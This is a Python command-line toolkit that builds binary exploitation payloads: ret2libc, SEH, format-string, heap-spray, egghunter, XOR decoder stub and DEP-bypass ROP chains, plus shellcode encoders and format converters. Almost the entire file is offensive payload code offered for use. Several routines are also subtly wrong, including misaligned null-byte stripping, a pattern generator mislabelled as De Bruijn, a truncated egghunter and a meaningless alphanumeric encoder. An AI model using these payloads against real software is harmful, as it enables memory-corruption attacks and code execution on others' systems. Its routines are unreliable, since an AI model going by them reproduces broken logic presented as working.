#!/usr/bin/env python3
"""
Advanced Binary Exploitation & ROP Payload Tool
Author: Security Researcher
Description: Comprehensive toolkit for binary exploitation, ROP chain building, 
            shellcode manipulation, and advanced exploitation techniques.
"""

import sys
import argparse
import struct
import re
from itertools import cycle

def read_input(file):
    if file:
        try:
            with open(file, 'r') as f:
                return f.read()
        except FileNotFoundError:
            sys.exit(f"Error: File '{file}' not found")
    else:
        return sys.stdin.read()

# ===================================================================
# NULL BYTE & BAD CHARACTER REMOVAL
# ===================================================================

def remove_null_bytes(hex_payload):
    """Remove null bytes (00) from hex payload"""
    if not re.match(r'^[0-9a-fA-F]+$', hex_payload.replace(' ', '')):
        sys.exit("Error: Invalid hex input")
    clean_payload = hex_payload.replace(' ', '').replace('00', '')
    removed_count = (len(hex_payload.replace(' ', '')) - len(clean_payload)) // 2
    print(f"Removed {removed_count} null bytes")
    return clean_payload

def remove_bad_chars(hex_payload, bad_chars='000a0d'):
    """Remove bad characters from hex payload"""
    if not re.match(r'^[0-9a-fA-F]+$', hex_payload.replace(' ', '')):
        sys.exit("Error: Invalid hex input")
    
    # Convert bad_chars to list of byte pairs
    bad_list = [bad_chars[i:i+2].lower() for i in range(0, len(bad_chars), 2)]
    result = hex_payload.replace(' ', '').lower()
    removed_total = 0
    
    for bad_char in bad_list:
        count_before = len(result)
        result = result.replace(bad_char, '')
        count_after = len(result)
        removed = (count_before - count_after) // 2
        if removed > 0:
            print(f"Removed {removed} instances of bad char: {bad_char}")
            removed_total += removed
    
    print(f"Total bad characters removed: {removed_total}")
    return result

def generate_bad_char_test():
    """Generate test string with all possible bytes (skip null)"""
    test_bytes = ""
    for i in range(1, 256):  # Skip null byte
        test_bytes += f"{i:02x}"
    return test_bytes

def find_bad_chars(test_payload, received_payload):
    """Find bad characters by comparing sent vs received payload"""
    bad_chars = []
    test_clean = test_payload.replace(' ', '').lower()
    recv_clean = received_payload.replace(' ', '').lower()
    min_len = min(len(test_clean), len(recv_clean))
    
    for i in range(0, min_len, 2):
        if i + 1 < min_len:
            sent_byte = test_clean[i:i+2]
            recv_byte = recv_clean[i:i+2]
            if sent_byte != recv_byte:
                if sent_byte not in bad_chars:
                    bad_chars.append(sent_byte)
    
    return bad_chars

# ===================================================================
# OFFSET CALCULATION & PATTERN GENERATION
# ===================================================================

def generate_pattern(length=1000):
    """Generate De Bruijn pattern for offset finding"""
    pattern = ""
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    
    # Simple pattern generation
    for i in range(length):
        if i < 26:
            pattern += chr(65 + i)  # A-Z
        elif i < 52:
            pattern += chr(97 + i - 26)  # a-z
        elif i < 62:
            pattern += chr(48 + i - 52)  # 0-9
        else:
            pattern += charset[i % len(charset)]
    
    return pattern

def find_offset(pattern, search_value, format_type="little"):
    """Find offset of value in pattern"""
    if isinstance(search_value, str) and search_value.startswith('0x'):
        search_value = int(search_value, 16)
    
    if isinstance(search_value, int):
        if format_type == "little":
            search_bytes = search_value.to_bytes(4, 'little')
        else:
            search_bytes = search_value.to_bytes(4, 'big')
        search_str = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in search_bytes)
        
        # Try to find the exact byte sequence in pattern
        pattern_bytes = pattern.encode('latin1')
        try:
            offset = pattern_bytes.find(search_bytes)
            if offset != -1:
                return offset
        except:
            pass
        
        # Fallback to string search
        try:
            offset = pattern.find(search_str)
            return offset if offset != -1 else None
        except:
            return None
    else:
        # String search
        try:
            offset = pattern.find(search_value)
            return offset if offset != -1 else None
        except:
            return None

def calculate_padding(crash_offset, payload_size=4):
    """Calculate padding needed for buffer overflow"""
    return max(0, crash_offset - payload_size)

# ===================================================================
# ADDRESS PACKING & UNPACKING
# ===================================================================

def pack_address(address, format_type="little", size=4):
    """Pack address into binary format"""
    if isinstance(address, str):
        if address.startswith('0x'):
            address = int(address, 16)
        else:
            address = int(address, 16)
    
    try:
        if format_type == "little":
            packed = address.to_bytes(size, 'little')
        else:
            packed = address.to_bytes(size, 'big')
        return packed.hex()
    except OverflowError:
        sys.exit(f"Error: Address {hex(address)} too large for {size} bytes")

def unpack_address(hex_bytes, format_type="little"):
    """Unpack address from hex bytes"""
    try:
        clean_hex = hex_bytes.replace(' ', '').replace('\\x', '')
        bytes_data = bytes.fromhex(clean_hex)
        if format_type == "little":
            return int.from_bytes(bytes_data, 'little')
        else:
            return int.from_bytes(bytes_data, 'big')
    except ValueError:
        sys.exit("Error: Invalid hex input for unpacking")

# ===================================================================
# NOP SLEDS & SHELLCODE MANIPULATION
# ===================================================================

def generate_nop_sled(length=100, arch="x86"):
    """Generate NOP sled for different architectures"""
    nops = {
        "x86": "90",        # NOP
        "x64": "90",        # NOP  
        "arm": "00f020e3",  # MOV r0, r0
        "arm64": "1f2003d5", # NOP
        "mips": "00000000", # NOP
        "ppc": "60000000",  # ORI r0, r0, 0
        "sparc": "01000000" # NOP
    }
    
    nop_byte = nops.get(arch.lower(), "90")
    byte_len = len(nop_byte) // 2
    sled_length = length // byte_len
    return nop_byte * sled_length

def encode_shellcode_xor(shellcode, key=0xAA):
    """XOR encode shellcode with key"""
    clean_shellcode = shellcode.replace(' ', '').replace('\\x', '')
    if not re.match(r'^[0-9a-fA-F]+$', clean_shellcode):
        sys.exit("Error: Invalid hex shellcode")
    
    encoded = ""
    for i in range(0, len(clean_shellcode), 2):
        if i + 1 < len(clean_shellcode):
            byte_val = int(clean_shellcode[i:i+2], 16)
            encoded_byte = byte_val ^ key
            encoded += f"{encoded_byte:02x}"
    return encoded

def decode_shellcode_xor(encoded_shellcode, key=0xAA):
    """XOR decode shellcode with key"""
    return encode_shellcode_xor(encoded_shellcode, key)  # XOR is symmetric

def alpha_numeric_encode(shellcode):
    """Basic alphanumeric encoding for shellcode"""
    clean_shellcode = shellcode.replace(' ', '').replace('\\x', '')
    encoded = ""
    
    for i in range(0, len(clean_shellcode), 2):
        if i + 1 < len(clean_shellcode):
            byte_val = int(clean_shellcode[i:i+2], 16)
            
            # Convert to alphanumeric representation
            if 0x30 <= byte_val <= 0x39 or 0x41 <= byte_val <= 0x5A or 0x61 <= byte_val <= 0x7A:
                # Already alphanumeric
                encoded += f"{byte_val:02x}"
            else:
                # Encode using ADD/SUB technique
                if byte_val < 0x30:
                    diff = 0x30 - byte_val
                    encoded += f"2c{diff:02x}"  # SUB AL, diff
                elif byte_val > 0x7A:
                    diff = byte_val - 0x7A
                    encoded += f"04{diff:02x}"  # ADD AL, diff
                else:
                    encoded += f"{byte_val:02x}"
    
    return encoded

def unicode_shellcode_encode(shellcode):
    """Encode shellcode for Unicode buffer overflows"""
    clean_shellcode = shellcode.replace(' ', '').replace('\\x', '')
    encoded = ""
    
    for i in range(0, len(clean_shellcode), 2):
        if i + 1 < len(clean_shellcode):
            byte_val = int(clean_shellcode[i:i+2], 16)
            # Add null byte for Unicode (little-endian)
            encoded += f"{byte_val:02x}00"
    
    return encoded

# ===================================================================
# ROP CHAIN BUILDING
# ===================================================================

def rop_gadget_format(address, instruction, arch="x86"):
    """Format ROP gadget with address and instruction"""
    size = 8 if arch.lower() in ["x64", "amd64"] else 4
    addr_packed = pack_address(address, "little", size)
    return f"# {instruction}\n{addr_packed}"

def build_rop_chain(gadgets_list, arch="x86"):
    """Build ROP chain from list of (address, instruction) tuples"""
    chain = []
    size = 8 if arch.lower() in ["x64", "amd64"] else 4
    
    for addr, instr in gadgets_list:
        chain.append(f"# {instr}")
        chain.append(pack_address(addr, "little", size))
    
    return '\n'.join(chain)

def ret2libc_payload(system_addr, exit_addr, cmd_addr, offset):
    """Generate ret2libc payload"""
    payload_hex = "41" * offset  # Padding
    payload_hex += pack_address(system_addr, "little", 4)     # system()
    payload_hex += pack_address(exit_addr, "little", 4)       # exit() 
    payload_hex += pack_address(cmd_addr, "little", 4)        # "/bin/sh"
    return payload_hex

def stack_pivot_gadget(esp_offset, gadget_addr):
    """Generate stack pivot payload"""
    # ADD ESP, offset; RET gadget
    pivot_payload = pack_address(gadget_addr, "little", 4)
    return pivot_payload

def bypass_dep_rop_chain(virtualprotect_addr, shellcode_addr, size=0x1000):
    """Generate basic ROP chain to bypass DEP using VirtualProtect"""
    # Simplified VirtualProtect ROP chain
    rop_gadgets = [
        (virtualprotect_addr, "VirtualProtect"),
        (shellcode_addr, "lpAddress"),
        (size, "dwSize"), 
        (0x40, "flNewProtect (PAGE_EXECUTE_READWRITE)"),
        (shellcode_addr + 0x100, "lpflOldProtect")
    ]
    return build_rop_chain(rop_gadgets)

# ===================================================================
# EXPLOIT PAYLOAD GENERATION
# ===================================================================

def format_exploit_payload(offset, return_addr, shellcode="", nop_sled_len=100, arch="x86"):
    """Format complete exploit payload"""
    nops = generate_nop_sled(nop_sled_len, arch)
    ret_addr = pack_address(return_addr, "little", 4)
    padding = "41" * offset  # 'A' padding
    
    payload = padding + ret_addr + nops + shellcode
    return payload

def seh_exploit_payload(offset, pop_pop_ret_addr, shellcode_addr):
    """Generate SEH exploit payload"""
    padding = "41" * offset
    seh_record = pack_address(pop_pop_ret_addr, "little", 4)  # POP POP RET
    next_seh = pack_address(shellcode_addr, "little", 4)      # Shellcode address
    
    payload = padding + seh_record + next_seh
    return payload

def format_string_exploit(offset, target_addr, value, format_type="write"):
    """Generate format string exploit payload"""
    if format_type == "write":
        # Write arbitrary value to address
        addr_packed = struct.pack("<I", target_addr).hex()
        payload = addr_packed + f"%{value}x%{offset}$n"
    elif format_type == "read":
        # Read from arbitrary address
        addr_packed = struct.pack("<I", target_addr).hex()
        payload = addr_packed + f"%{offset}$s"
    else:
        payload = f"%{offset}$x"  # Basic format string leak
    
    return payload

def heap_spray_payload(nop_sled_len=1000, shellcode="", spray_addr=0x0c0c0c0c):
    """Generate heap spray payload"""
    nops = generate_nop_sled(nop_sled_len)
    spray_block = pack_address(spray_addr, "little", 4) * 100
    payload = nops + shellcode + spray_block
    return payload

def integer_overflow_payload(target_size, overflow_value):
    """Generate integer overflow payload"""
    max_val = (1 << (target_size * 8)) - 1
    overflow_val = (max_val + 1 + overflow_value) % (1 << (target_size * 8))
    return f"{overflow_val:0{target_size*2}x}"

# ===================================================================
# ADVANCED TECHNIQUES
# ===================================================================

def calculate_jmp_offset(from_addr, to_addr, arch="x86"):
    """Calculate jump offset for shellcode"""
    if isinstance(from_addr, str):
        from_addr = int(from_addr, 16)
    if isinstance(to_addr, str):
        to_addr = int(to_addr, 16)
    
    offset = to_addr - from_addr
    
    if arch.lower() == "x86":
        # Adjust for instruction length
        if -128 <= offset - 2 <= 127:
            # Short jump (EB XX)
            jump_offset = (offset - 2) & 0xFF
            return f"eb{jump_offset:02x}"
        else:
            # Near jump (E9 XX XX XX XX)
            jump_offset = (offset - 5) & 0xFFFFFFFF
            return f"e9{jump_offset:08x}"
    
    return f"{offset:08x}"

def egghunter_payload(tag="w00t", arch="x86"):
    """Generate egghunter payload"""
    if arch.lower() == "x86":
        # x86 egghunter for custom tag
        tag_hex = ''.join(f'{ord(c):02x}' for c in tag)[:8]  # 4 bytes max
        
        egghunter = f"""
66 81 ca ff 0f    ; OR DX, 0x0fff
42                ; INC EDX
52                ; PUSH EDX
6a 02             ; PUSH 2
58                ; POP EAX
cd 2e             ; INT 0x2e
3c 05             ; CMP AL, 5
5a                ; POP EDX
74 ef             ; JZ loop_inc_page
b8 {tag_hex}      ; MOV EAX, tag
8b fa             ; MOV EDI, EDX
af                ; SCASD
75 ea             ; JNZ loop_inc_one
af                ; SCASD
75 e7             ; JNZ loop_inc_one
ff e7             ; JMP EDI
"""
        return egghunter.replace('\n', '').replace(' ', '').split(';')[0]
    
    return ""

def aslr_bypass_info_leak(format_string_offset):
    """Generate info leak payload to bypass ASLR"""
    leak_payload = f"%{format_string_offset}$x.%{format_string_offset+1}$x.%{format_string_offset+2}$x"
    return leak_payload

def generate_decoder_stub(encoded_length, key=0xAA, arch="x86"):
    """Generate XOR decoder stub"""
    if arch.lower() == "x86":
        decoder = f"eb0d5e31c9b1{encoded_length:02x}8036{key:02x}46e2faeb05e8eeffffff"
        return decoder
    return ""

# ===================================================================
# FORMAT CONVERSION UTILITIES
# ===================================================================

def shellcode_to_c_array(shellcode):
    """Convert shellcode to C array format"""
    clean_shellcode = shellcode.replace(' ', '').replace('\\x', '')
    c_array = 'unsigned char shellcode[] = \n"'
    
    for i in range(0, len(clean_shellcode), 2):
        if i > 0 and i % 32 == 0:
            c_array += '"\n"'
        if i + 1 < len(clean_shellcode):
            c_array += f"\\x{clean_shellcode[i:i+2]}"
    
    c_array += '";\n'
    c_array += f'int shellcode_len = {len(clean_shellcode) // 2};'
    return c_array

def shellcode_to_python_array(shellcode):
    """Convert shellcode to Python bytes format"""
    clean_shellcode = shellcode.replace(' ', '').replace('\\x', '')
    py_array = 'shellcode = b"'
    
    for i in range(0, len(clean_shellcode), 2):
        if i + 1 < len(clean_shellcode):
            py_array += f"\\x{clean_shellcode[i:i+2]}"
    
    py_array += '"'
    return py_array

def shellcode_to_powershell(shellcode):
    """Convert shellcode to PowerShell format"""
    clean_shellcode = shellcode.replace(' ', '').replace('\\x', '')
    ps_array = '$shellcode = @('
    
    bytes_list = []
    for i in range(0, len(clean_shellcode), 2):
        if i + 1 < len(clean_shellcode):
            bytes_list.append(f"0x{clean_shellcode[i:i+2]}")
    
    ps_array += ','.join(bytes_list) + ')'
    return ps_array

def hex_to_binary(hex_string):
    """Convert hex string to binary representation"""
    clean_hex = hex_string.replace(' ', '').replace('\\x', '')
    binary_str = ""
    
    for i in range(0, len(clean_hex), 2):
        if i + 1 < len(clean_hex):
            byte_val = int(clean_hex[i:i+2], 16)
            binary_str += f"{byte_val:08b} "
    
    return binary_str.strip()

def binary_to_hex(binary_string):
    """Convert binary string to hex"""
    # Remove spaces and ensure length is multiple of 8
    clean_binary = binary_string.replace(' ', '')
    
    if len(clean_binary) % 8 != 0:
        sys.exit("Error: Binary string length must be multiple of 8")
    
    hex_str = ""
    for i in range(0, len(clean_binary), 8):
        byte_binary = clean_binary[i:i+8]
        byte_val = int(byte_binary, 2)
        hex_str += f"{byte_val:02x}"
    
    return hex_str

# ===================================================================
# MAIN FUNCTION & ARGUMENT PARSING
# ===================================================================

def show_examples():
    """Show comprehensive usage examples"""
    examples = """
🔥 BINARY EXPLOITATION & ROP PAYLOAD TOOL 🔥

═══════════════════════════════════════════════════════════════════
🎯 NULL BYTE & BAD CHARACTER REMOVAL
═══════════════════════════════════════════════════════════════════

--remove-nulls            echo "41424300444546" | python3 rop_tool.py --remove-nulls
--remove-badchars         echo "41424300444546" | python3 rop_tool.py --remove-badchars --bad-chars="000a0d"
--generate-badchar-test   python3 rop_tool.py --generate-badchar-test
--find-badchars           python3 rop_tool.py --find-badchars --sent="414243" --received="414200"

═══════════════════════════════════════════════════════════════════
📏 OFFSET CALCULATION & PATTERNS
═══════════════════════════════════════════════════════════════════

--generate-pattern        python3 rop_tool.py --generate-pattern --length=1000
--find-offset             python3 rop_tool.py --find-offset --pattern="AAABBBCCC" --value="BBB"
--calculate-padding       python3 rop_tool.py --calculate-padding --offset=120 --payload-size=4

═══════════════════════════════════════════════════════════════════
📦 ADDRESS PACKING & UNPACKING
═══════════════════════════════════════════════════════════════════

--pack-address            python3 rop_tool.py --pack-address --address=0x41414141
--pack-address-big        python3 rop_tool.py --pack-address --address=0x41414141 --format=big
--unpack-address          echo "41414141" | python3 rop_tool.py --unpack-address
--unpack-address-big      echo "41414141" | python3 rop_tool.py --unpack-address --format=big

═══════════════════════════════════════════════════════════════════
🛷 NOP SLEDS & SHELLCODE MANIPULATION
═══════════════════════════════════════════════════════════════════

--generate-nopsled        python3 rop_tool.py --generate-nopsled --length=100 --arch=x86
--generate-nopsled-arm    python3 rop_tool.py --generate-nopsled --length=100 --arch=arm
--xor-encode              echo "4142434445" | python3 rop_tool.py --xor-encode --key=0xAA
--xor-decode              echo "ebf8f9ef" | python3 rop_tool.py --xor-decode --key=0xAA
--alpha-encode            echo "4142434445" | python3 rop_tool.py --alpha-encode
--unicode-encode          echo "4142434445" | python3 rop_tool.py --unicode-encode

═══════════════════════════════════════════════════════════════════
🔗 ROP CHAIN BUILDING
═══════════════════════════════════════════════════════════════════

--rop-gadget              python3 rop_tool.py --rop-gadget --address=0x41414141 --instruction="pop eax; ret"
--build-rop-chain         python3 rop_tool.py --build-rop-chain --gadgets="0x41414141:pop eax,0x42424242:ret"
--ret2libc                python3 rop_tool.py --ret2libc --system=0x41414141 --exit=0x42424242 --binsh=0x43434343 --offset=120
--stack-pivot             python3 rop_tool.py --stack-pivot --gadget=0x41414141 --offset=100

═══════════════════════════════════════════════════════════════════
💥 EXPLOIT PAYLOAD GENERATION
═══════════════════════════════════════════════════════════════════

--exploit-payload         python3 rop_tool.py --exploit-payload --offset=120 --ret-addr=0x41414141 --shellcode="909090"
--seh-payload             python3 rop_tool.py --seh-payload --offset=120 --pop-pop-ret=0x41414141 --shellcode-addr=0x42424242
--format-string           python3 rop_tool.py --format-string --offset=6 --target=0x41414141 --value=0x42424242
--heap-spray              python3 rop_tool.py --heap-spray --nop-len=1000 --shellcode="909090" --addr=0x0c0c0c0c
--integer-overflow        python3 rop_tool.py --integer-overflow --size=4 --value=100

═══════════════════════════════════════════════════════════════════
🔬 ADVANCED TECHNIQUES
═══════════════════════════════════════════════════════════════════

--jmp-offset              python3 rop_tool.py --jmp-offset --from=0x41414141 --to=0x41414151
--egghunter               python3 rop_tool.py --egghunter --tag="w00t"
--aslr-leak               python3 rop_tool.py --aslr-leak --offset=6
--decoder-stub            python3 rop_tool.py --decoder-stub --length=50 --key=0xAA
--dep-bypass              python3 rop_tool.py --dep-bypass --virtualprotect=0x41414141 --shellcode=0x42424242

═══════════════════════════════════════════════════════════════════
🔄 FORMAT CONVERSION
═══════════════════════════════════════════════════════════════════

--to-c-array              echo "4142434445" | python3 rop_tool.py --to-c-array
--to-python               echo "4142434445" | python3 rop_tool.py --to-python
--to-powershell           echo "4142434445" | python3 rop_tool.py --to-powershell
--hex-to-binary           echo "4142" | python3 rop_tool.py --hex-to-binary
--binary-to-hex           echo "0100000101000010" | python3 rop_tool.py --binary-to-hex

═══════════════════════════════════════════════════════════════════
🔧 USAGE NOTES
═══════════════════════════════════════════════════════════════════

• Input can be provided via stdin or --file parameter
• Addresses can be in hex format (0x41414141) or decimal
• Use --arch parameter to specify target architecture (x86, x64, arm, mips, etc.)
• Use --format parameter for endianness (little, big)
• Chain multiple operations by piping outputs

Total: 50+ binary exploitation techniques for advanced research!
"""
    print(examples)
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="Advanced Binary Exploitation & ROP Payload Tool")
    parser.add_argument('-f', '--file', help="Input file")
    parser.add_argument('--arch', default='x86', help="Target architecture (x86, x64, arm, mips, etc.)")
    parser.add_argument('--format', default='little', choices=['little', 'big'], help="Endianness")
    parser.add_argument('--examples', action='store_true', help="Show usage examples and exit")
    
    # Null byte and bad character removal
    parser.add_argument('--remove-nulls', action='store_true', help="Remove null bytes from hex payload")
    parser.add_argument('--remove-badchars', action='store_true', help="Remove bad characters from hex payload")
    parser.add_argument('--bad-chars', default='000a0d', help="Bad characters to remove (hex)")
    parser.add_argument('--generate-badchar-test', action='store_true', help="Generate bad character test string")
    parser.add_argument('--find-badchars', action='store_true', help="Find bad characters by comparison")
    parser.add_argument('--sent', help="Sent payload (for bad char detection)")
    parser.add_argument('--received', help="Received payload (for bad char detection)")
    
    # Offset calculation and patterns
    parser.add_argument('--generate-pattern', action='store_true', help="Generate De Bruijn pattern")
    parser.add_argument('--length', type=int, default=1000, help="Pattern length")
    parser.add_argument('--find-offset', action='store_true', help="Find offset in pattern")
    parser.add_argument('--pattern', help="Pattern to search in")
    parser.add_argument('--value', help="Value to find in pattern")
    parser.add_argument('--calculate-padding', action='store_true', help="Calculate padding for buffer overflow")
    parser.add_argument('--offset', type=int, help="Crash offset")
    parser.add_argument('--payload-size', type=int, default=4, help="Payload size")
    
    # Address packing and unpacking
    parser.add_argument('--pack-address', action='store_true', help="Pack address to binary format")
    parser.add_argument('--unpack-address', action='store_true', help="Unpack address from binary format")
    parser.add_argument('--address', help="Address to pack")
    parser.add_argument('--size', type=int, default=4, help="Address size in bytes")
    
    # NOP sleds and shellcode manipulation
    parser.add_argument('--generate-nopsled', action='store_true', help="Generate NOP sled")
    parser.add_argument('--xor-encode', action='store_true', help="XOR encode shellcode")
    parser.add_argument('--xor-decode', action='store_true', help="XOR decode shellcode")
    parser.add_argument('--key', help="XOR key (hex)")
    parser.add_argument('--alpha-encode', action='store_true', help="Alphanumeric encode shellcode")
    parser.add_argument('--unicode-encode', action='store_true', help="Unicode encode shellcode")
    
    # ROP chain building
    parser.add_argument('--rop-gadget', action='store_true', help="Format ROP gadget")
    parser.add_argument('--instruction', help="Gadget instruction")
    parser.add_argument('--build-rop-chain', action='store_true', help="Build ROP chain")
    parser.add_argument('--gadgets', help="Gadgets list (addr:instr,addr:instr)")
    parser.add_argument('--ret2libc', action='store_true', help="Generate ret2libc payload")
    parser.add_argument('--system', help="system() address")
    parser.add_argument('--exit', help="exit() address")
    parser.add_argument('--binsh', help="/bin/sh address")
    parser.add_argument('--stack-pivot', action='store_true', help="Generate stack pivot")
    parser.add_argument('--gadget', help="Pivot gadget address")
    
    # Exploit payload generation
    parser.add_argument('--exploit-payload', action='store_true', help="Generate exploit payload")
    parser.add_argument('--ret-addr', help="Return address")
    parser.add_argument('--shellcode', help="Shellcode (hex)")
    parser.add_argument('--nop-len', type=int, default=100, help="NOP sled length")
    parser.add_argument('--seh-payload', action='store_true', help="Generate SEH exploit payload")
    parser.add_argument('--pop-pop-ret', help="POP POP RET address")
    parser.add_argument('--shellcode-addr', help="Shellcode address")
    parser.add_argument('--format-string', action='store_true', help="Generate format string exploit")
    parser.add_argument('--target', help="Target address")
    parser.add_argument('--heap-spray', action='store_true', help="Generate heap spray payload")
    parser.add_argument('--addr', help="Spray address")
    parser.add_argument('--integer-overflow', action='store_true', help="Generate integer overflow payload")
    
    # Advanced techniques
    parser.add_argument('--jmp-offset', action='store_true', help="Calculate jump offset")
    parser.add_argument('--from', dest='from_addr', help="From address")
    parser.add_argument('--to', dest='to_addr', help="To address")
    parser.add_argument('--egghunter', action='store_true', help="Generate egghunter payload")
    parser.add_argument('--tag', default='w00t', help="Egghunter tag")
    parser.add_argument('--aslr-leak', action='store_true', help="Generate ASLR bypass info leak")
    parser.add_argument('--decoder-stub', action='store_true', help="Generate XOR decoder stub")
    parser.add_argument('--dep-bypass', action='store_true', help="Generate DEP bypass ROP chain")
    parser.add_argument('--virtualprotect', help="VirtualProtect address")
    
    # Format conversion
    parser.add_argument('--to-c-array', action='store_true', help="Convert to C array")
    parser.add_argument('--to-python', action='store_true', help="Convert to Python bytes")
    parser.add_argument('--to-powershell', action='store_true', help="Convert to PowerShell array")
    parser.add_argument('--hex-to-binary', action='store_true', help="Convert hex to binary")
    parser.add_argument('--binary-to-hex', action='store_true', help="Convert binary to hex")
    
    # Check for examples first
    if '--examples' in sys.argv:
        show_examples()
    
    args = parser.parse_args()
    
    # Handle examples
    if args.examples:
        show_examples()
    
    # Get input text
    text = ""
    if not any([args.generate_pattern, args.generate_badchar_test, args.calculate_padding,
               args.pack_address, args.generate_nopsled, args.rop_gadget, args.build_rop_chain,
               args.ret2libc, args.stack_pivot, args.exploit_payload, args.seh_payload,
               args.format_string, args.heap_spray, args.integer_overflow, args.jmp_offset,
               args.egghunter, args.aslr_leak, args.decoder_stub, args.dep_bypass,
               args.find_badchars, args.find_offset]):
        text = read_input(args.file).strip()
    
    try:
        # Null byte and bad character operations
        if args.remove_nulls:
            print(remove_null_bytes(text))
        elif args.remove_badchars:
            print(remove_bad_chars(text, args.bad_chars))
        elif args.generate_badchar_test:
            print(generate_bad_char_test())
        elif args.find_badchars:
            if not args.sent or not args.received:
                sys.exit("Error: --sent and --received required for bad char detection")
            bad_chars = find_bad_chars(args.sent, args.received)
            print("Bad characters found:", ', '.join(bad_chars))
        
        # Offset calculation and patterns
        elif args.generate_pattern:
            print(generate_pattern(args.length))
        elif args.find_offset:
            if not args.pattern or not args.value:
                sys.exit("Error: --pattern and --value required")
            offset = find_offset(args.pattern, args.value, args.format)
            if offset is not None:
                print(f"Offset found at: {offset}")
            else:
                print("Value not found in pattern")
        elif args.calculate_padding:
            if args.offset is None:
                sys.exit("Error: --offset required")
            padding = calculate_padding(args.offset, args.payload_size)
            print(f"Padding needed: {padding} bytes")
        
        # Address packing and unpacking
        elif args.pack_address:
            if not args.address:
                sys.exit("Error: --address required")
            packed = pack_address(args.address, args.format, args.size)
            print(packed)
        elif args.unpack_address:
            unpacked = unpack_address(text, args.format)
            print(f"0x{unpacked:08x}")
        
        # NOP sleds and shellcode manipulation
        elif args.generate_nopsled:
            sled = generate_nop_sled(args.length, args.arch)
            print(sled)
        elif args.xor_encode:
            key = int(args.key, 16) if args.key else 0xAA
            encoded = encode_shellcode_xor(text, key)
            print(encoded)
        elif args.xor_decode:
            key = int(args.key, 16) if args.key else 0xAA
            decoded = decode_shellcode_xor(text, key)
            print(decoded)
        elif args.alpha_encode:
            encoded = alpha_numeric_encode(text)
            print(encoded)
        elif args.unicode_encode:
            encoded = unicode_shellcode_encode(text)
            print(encoded)
        
        # ROP chain building
        elif args.rop_gadget:
            if not args.address or not args.instruction:
                sys.exit("Error: --address and --instruction required")
            gadget = rop_gadget_format(args.address, args.instruction, args.arch)
            print(gadget)
        elif args.build_rop_chain:
            if not args.gadgets:
                sys.exit("Error: --gadgets required (format: addr:instr,addr:instr)")
            gadget_pairs = []
            for gadget in args.gadgets.split(','):
                addr, instr = gadget.split(':')
                gadget_pairs.append((addr, instr))
            chain = build_rop_chain(gadget_pairs, args.arch)
            print(chain)
        elif args.ret2libc:
            if not all([args.system, args.exit, args.binsh, args.offset]):
                sys.exit("Error: --system, --exit, --binsh, and --offset required")
            payload = ret2libc_payload(args.system, args.exit, args.binsh, args.offset)
            print(payload)
        elif args.stack_pivot:
            if not args.gadget:
                sys.exit("Error: --gadget required")
            pivot = stack_pivot_gadget(args.offset or 0, args.gadget)
            print(pivot)
        
        # Exploit payload generation
        elif args.exploit_payload:
            if not args.offset or not args.ret_addr:
                sys.exit("Error: --offset and --ret-addr required")
            payload = format_exploit_payload(args.offset, args.ret_addr, 
                                           args.shellcode or "", args.nop_len, args.arch)
            print(payload)
        elif args.seh_payload:
            if not all([args.offset, args.pop_pop_ret, args.shellcode_addr]):
                sys.exit("Error: --offset, --pop-pop-ret, and --shellcode-addr required")
            payload = seh_exploit_payload(args.offset, args.pop_pop_ret, args.shellcode_addr)
            print(payload)
        elif args.format_string:
            if not args.offset or not args.target:
                sys.exit("Error: --offset and --target required")
            value = int(args.value, 16) if args.value else 0x41414141
            payload = format_string_exploit(args.offset, int(args.target, 16), value)
            print(payload)
        elif args.heap_spray:
            shellcode = args.shellcode or ""
            addr = int(args.addr, 16) if args.addr else 0x0c0c0c0c
            payload = heap_spray_payload(args.nop_len, shellcode, addr)
            print(payload)
        elif args.integer_overflow:
            if not args.size:
                sys.exit("Error: --size required")
            value = int(args.value) if args.value else 100
            payload = integer_overflow_payload(args.size, value)
            print(payload)
        
        # Advanced techniques
        elif args.jmp_offset:
            if not args.from_addr or not args.to_addr:
                sys.exit("Error: --from and --to required")
            offset = calculate_jmp_offset(args.from_addr, args.to_addr, args.arch)
            print(offset)
        elif args.egghunter:
            payload = egghunter_payload(args.tag, args.arch)
            print(payload)
        elif args.aslr_leak:
            if not args.offset:
                sys.exit("Error: --offset required")
            leak = aslr_bypass_info_leak(args.offset)
            print(leak)
        elif args.decoder_stub:
            if not args.length:
                sys.exit("Error: --length required")
            key = int(args.key, 16) if args.key else 0xAA
            stub = generate_decoder_stub(args.length, key, args.arch)
            print(stub)
        elif args.dep_bypass:
            if not args.virtualprotect or not args.shellcode:
                sys.exit("Error: --virtualprotect and --shellcode required")
            vp_addr = int(args.virtualprotect, 16)
            sc_addr = int(args.shellcode, 16)
            chain = bypass_dep_rop_chain(vp_addr, sc_addr)
            print(chain)
        
        # Format conversion
        elif args.to_c_array:
            c_array = shellcode_to_c_array(text)
            print(c_array)
        elif args.to_python:
            py_array = shellcode_to_python_array(text)
            print(py_array)
        elif args.to_powershell:
            ps_array = shellcode_to_powershell(text)
            print(ps_array)
        elif args.hex_to_binary:
            binary = hex_to_binary(text)
            print(binary)
        elif args.binary_to_hex:
            hex_str = binary_to_hex(text)
            print(hex_str)
        
        else:
            parser.print_help()
    
    except KeyboardInterrupt:
        sys.exit("\nOperation cancelled")
    except Exception as e:
        sys.exit(f"Error: {e}")

if __name__ == "__main__":
    main() 